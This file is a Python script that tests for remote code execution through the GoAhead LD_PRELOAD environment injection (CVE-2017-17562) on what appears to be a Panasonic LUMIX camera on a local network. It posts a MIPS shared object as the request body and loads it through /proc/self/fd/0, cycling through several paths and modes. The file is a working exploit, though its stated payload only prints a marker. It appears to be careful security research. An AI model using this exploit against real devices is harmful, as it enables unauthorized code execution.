#!/usr/bin/env python3
"""rce_ldpreload.py — Test CVE-2017-17562 (GoAhead LD_PRELOAD env injection).

Mechanism (elttam / EDB-43360): GoAhead's cgiHandler copies UNFILTERED HTTP
query params into the CGI's envp, then fork+execve's the CGI. If the CGI is
dynamically linked, the glibc dynamic linker honors LD_PRELOAD. We POST our
MIPS .so as the request BODY (which becomes the CGI's stdin pipe = fd 0) and
reference it via LD_PRELOAD=/proc/self/fd/0. ld.so reads the .so from the
pipe and runs its constructor BEFORE main. Our constructor writes a
controlled marker string to fd 1 (stdout), which GoAhead captures as the
HTTP response body. If the marker appears in the response -> RCE.

SAFETY: the payload's constructor only does write(1, "S5_RCE_PROOF\\n", 13).
No file writes, no network, no memory corruption. Worst case = no effect or
a clean (recoverable) load failure.
"""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import KA, parse_camrply

IP = "192.168.1.131"; PORT = 80
MARKER = "S5_RCE_PROOF"
HERE = os.path.dirname(os.path.abspath(__file__))

def log(m): print("[%s] %s" % (time.strftime("%H:%M:%S"), m), flush=True)

def health(t=5):
    try:
        ka = KA(IP, port=PORT, timeout=t)
        st,_,b,dt = ka.request("GET","/cam.cgi?mode=getstate")
        r = parse_camrply(b).get("result","?"); ka.close(); return r
    except Exception:
        return "OFFLINE"

def wait_ok(max_wait=120):
    t0=time.time()
    while time.time()-t0<max_wait:
        if health().lower()=="ok": return True
        time.sleep(5)
    return False

def load_payloads():
    cands=[]
    for n in ("s5pre_mipsel.so","s5pre_mips.so","s5pre_mipsel_big.so","s5pre_mips_big.so"):
        p=os.path.join(HERE,n)
        if os.path.exists(p): cands.append((n,open(p,"rb").read()))
    return cands

def fire(so_bytes, preload_path, mode="getstate"):
    ka = KA(IP, port=PORT, timeout=15)
    path = "/cam.cgi?mode=%s&LD_PRELOAD=%s" % (mode, preload_path)
    req = ("POST %s HTTP/1.1\r\n"
           "Host: %s\r\n"
           "User-Agent: LUMIX Sync\r\n"
           "Content-Type: application/octet-stream\r\n"
           "Content-Length: %d\r\n"
           "Connection: Keep-Alive\r\n\r\n" % (path, IP, len(so_bytes))).encode() + so_bytes
    t0=time.time()
    st, hdrs, body, dt = ka.send(req)
    ka.close()
    got = MARKER in body.decode("latin1","replace")
    log("  status=%s bodylen=%d marker=%s (%.0fms)" % (st, len(body), got, dt*1000))
    head = body[:160].decode("latin1","replace").replace("\n"," ")
    log("  body head: %r" % head)
    if got:
        log("  *** RCE CONFIRMED: marker found in response ***")
    return got, body

def main():
    log("S5 LD_PRELOAD RCE test (CVE-2017-17562)")
    log("target=%s marker=%s" % (IP, MARKER))
    if not wait_ok(90):
        log("camera not ready; abort"); return
    log("camera ready.")
    payloads = load_payloads()
    if not payloads:
        log("no .so payload found in %s; build it first" % HERE); return

    paths = ["/proc/self/fd/0","/proc/self/fd/3","/proc/self/fd/4","/dev/stdin","/proc/self/fd/255"]
    modes = ["getstate","getinfo&type=camsetting"]
    for name, so in payloads:
        log("\n== payload %s (%d bytes) ==" % (name, len(so)))
        for p in paths:
            for m in modes:
                try:
                    got, _ = fire(so, p, m)
                except Exception as e:
                    log("  EXC %s: %s" % (type(e).__name__, e)); continue
                if got:
                    log("RCE via payload=%s preload=%s mode=%s" % (name,p,m)); return
                time.sleep(0.8)
                h = health(5)
                if h.lower()!="ok":
                    log("  !! health=%s after probe; waiting" % h)
                    if not wait_ok(120):
                        log("  !! NOT RECOVERING; stopping"); return
    log("\nDONE: no RCE marker observed across all payload/preload/mode combos")

if __name__ == "__main__":
    main()
